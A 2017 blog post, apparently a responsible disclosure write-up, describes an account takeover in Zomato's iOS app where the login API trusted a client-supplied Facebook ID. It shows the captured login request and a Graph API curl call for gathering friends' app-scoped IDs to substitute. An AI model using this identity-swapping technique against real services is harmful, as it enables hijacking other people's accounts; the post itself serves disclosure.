---
layout: post
title:  Zomato Account Takeover using Victim's Facebook ID
date:   2017-08-20 16:00:00 +0530
categories: [Mobile Security]
---

This was an issue, I reported to Zomato a few months back where an attacker could have compromised any user's account who had linked their Facebook with Zomato. And since most of the people uses Login with Facebook nowadays, I was actually able to gain access to over 1000s of user accounts.

While performing login with Facebook on iOS app, this is the request that was sent to the server:


```sh
POST /v2/auth.json?presentlat=xxxxxxx&useragent=model_iPod%20touch_os_9.3.5v_7.0_t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=xxxxxxxx&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=█████████ HTTP/1.1
Host: 1api.zomato.com
Accept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6
Accept: /
User-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)
X-Zomato-API-Key: █████████
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive
app_version: 7.0
Cookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en
Content-Length: 984
Accept-Encoding: gzip

access_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=████████&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=█████

```

Looking at it carefully, I found the API was also sending **fbid** in the requested parameters. So I tried to change it with another Facebook ID. But how to find a victim's Facebook ID as they are different for different apps. By using Facebook's Graph API, you can find a list of your friends as well second degree friends who are using Login with Facebook for Zomato. This Graph API request can return your friends Facebook IDs by sending your Facebook generated Acceess Token.

```sh
curl -i -X GET \
"https://graph.facebook.com/v2.10/me/friends?access_token=xxxxxxxx"
```
Now by using this Facebook ID and replacing it in the Zomato's request, it bypassed the login and gave me a complete control over the victim's account. Game Over!

